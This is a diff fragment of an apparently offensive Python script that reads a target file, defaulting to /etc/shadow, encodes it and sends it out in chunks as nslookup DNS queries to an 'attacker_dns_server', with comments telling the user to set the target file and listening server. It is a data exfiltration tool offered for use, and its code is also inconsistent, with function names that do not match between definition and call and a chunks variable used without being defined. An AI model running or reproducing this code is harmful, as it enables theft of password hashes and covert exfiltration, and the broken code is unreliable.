@@ -19,3 +19,24 @@ def read_and_encode_file(file_path):
 #Split encoded data into chunks
 def send_chunks(encoded_data, chunk_size, attacker_dns_server, domain):
   
+ # Send each chunk using nslookup
+    for chunk in chunks:
+        query = chunk + "." + domain
+        nslookup_command = ['nslookup', query, attacker_dns_server]
+        subprocess.run(nslookup_command)
+
+def main():
+    # Configuration
+    file_path = '/etc/shadow'  #CHANGE THIS TO TARGET FILE PATH
+    chunk_size = 50
+    attacker_dns_server = '192.168.27.136' #CHANGE THIS TO LISTENING SERVER IP
+    domain = 'example.com' #CHANGE THIS TO WHATEVER
+
+    # Step 1: Read and encode the file
+    encoded_data = read_file_and_encode(file_path)
+
+    # Step 2: Send each chunk via DNS using nslookup
+    send_chunks_via_dns(encoded_data, chunk_size, attacker_dns_server, domain)
+
+if __name__ == "__main__":
+    main()
